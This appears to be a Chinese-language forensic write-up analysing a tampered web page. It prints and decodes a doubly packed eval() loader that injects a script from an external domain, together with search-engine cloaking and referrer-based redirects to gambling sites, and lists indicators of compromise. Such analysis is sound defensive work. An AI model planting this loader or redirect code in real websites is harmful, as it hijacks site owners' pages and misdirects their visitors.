---
title: "页面篡改分析-两次js加密案例"
parent: "0x03取证分析"
---
## 两次js加密案例

本次案例在日常工作中发现，2次的js加密案例，分享分析过程。

![image-20210601124004491](image-20210601124004491.png)

### 案例分析

在访问页面的时候baidu UA导致跳转，源码如下：

```
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>&#22836;&#22836;&#124;&#20307;&#32946;&#45;&#23448;&#32593;</title>
<meta name="keywords" content="&#22836;&#22836;&#124;&#20307;&#32946;&#45;&#23448;&#32593;"/>
<meta name="description" content="&#22836;&#22836;&#124;&#20307;&#32946;&#45;&#23448;&#32593;&#12304;&#23448;&#32593;&#65306;&#97;&#121;&#120;&#98;&#101;&#116;&#57;&#56;&#55;&#46;&#99;&#111;&#109;&#12305;&#25552;&#20379;"/>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="正常页面的title值xxxx"}</script>
......
<script type="text/javascript">eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('m(d(p,a,c,k,e,r){e=d(c){f c.n(a)};h(!\'\'.i(/^/,o)){j(c--)r[e(c)]=k[c]||e(c);k=[d(e){f r[e]}];e=d(){f\'\\\\w+\'};c=1};j(c--)h(k[c])p=p.i(q s(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);f p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a/b.c"></0>\\\');\',l,l,\'t|u|v|x|y|z|A|B|C|D|E|F|G\'.H(\'|\'),0,{}))',44,44,'|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split'.split('|'),0,{}))
</script>
```

首先页面title被篡改，如果是非baidu UA则会展示正常页面的title值，如果是baidu UA则会使用被篡改的title展示，如百度搜索等。

```
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('m(d(p,a,c,k,e,r){e=d(c){f c.n(a)};h(!\'\'.i(/^/,o)){j(c--)r[e(c)]=k[c]||e(c);k=[d(e){f r[e]}];e=d(){f\'\\\\w+\'};c=1};j(c--)h(k[c])p=p.i(q s(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);f p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a/b.c"></0>\\\');\',l,l,\'t|u|v|x|y|z|A|B|C|D|E|F|G\'.H(\'|\'),0,{}))',44,44,'|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|lelele2|com|cp|js|split'.split('|'),0,{}))
```

eval内容为主要跳转内容，通常这种形式考虑js加密，但此内容发现一层嵌套格式，而且js解完如下，仍然为js加密形式：

```
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1["2"]["3"](\'<0 4="5/6" 7="8://9.a/b.c"></0>\');',13,13,'script|window|document|write|type|text|javascript|src|https|lelele2|com|cp|js'.split('|'),0,{}))
```

再次进行解密最终显示出其跳转：

```
window["document"]["write"]('<script type="text/javascript" src="https[://]lelele2[.]com[/]cp[.]js"></script>');
```

通过跟踪脚本内容可以看到，该样本先将统计信息发送到360，百度。之后通过在原页面中写入跳转脚本，实现跳转
```
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2a49ee9e85a5fb54cf65d27a54cf81b6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
(function () {
    /*百度推送代码*/
     var bp = document.createElement('script');
     bp.src = '//push.zhanzhang.baidu.com/push.js';
     var s = document.getElementsByTagName("script")[0];
     s.parentNode.insertBefore(bp, s);
     /*360推送代码*/
     var src = document.location.protocol + '//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9';
     document.write('<script src="' + src + '" id="sozz"><\/script>');
     })();

document.writeln("<script LANGUAGE=\"Javascript\">");
document.writeln("var s=document.referrer");
document.writeln("if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 )");
document.writeln("location.href=\"https[://]2021531[.]com\";");
document.writeln("</script>");
```
10s跳转页面，加载http[]://]lelele1[/]yb.js （无效）脚本（此内容根据推断应该为http[]://]lelele1[.]com[/]yb.js此脚本同上面一个脚本，实际上可以确保如果一个没有跳转，功能相同可能这里被改成了无效）
```
<html>
<head>
    <meta charset="utf-8">
    <title>爱游戏官网 </title>
...
<script src="&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#108;&#101;&#108;&#101;&#108;&#101;&#49;&#47;&#121;&#98;&#46;&#106;&#115;"></script>
  <script>
          setTimeout(function(){
           var arr=['https[://]ayxvip8855[.]com',];
          window.location.href=arr[parseInt(Math.random()*arr.length)];
          },10);
     </script>
</head>
<body>
    <div class="container">
        <h1>爱游戏官网 马上进入.....</h1>
        <h3>正在为您匹配最佳线路.....</h3>
        <ul>
          <li>本站使用：当您访问本站的时候出现不能正常访问，请刷新网站或从新打开访问，系统自动为您匹配最佳访问网址</li>
      <li>
</body>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1278159129'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s9.cnzz.com/z_stat.php%3Fid%3D1278159129%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</html>
```




##### IOCs
https[:]//lelele2[.]com[/]cp.js
2021531[.]com
ayxvip8855[.]com
http://lelele1.com[/]yb[.]js



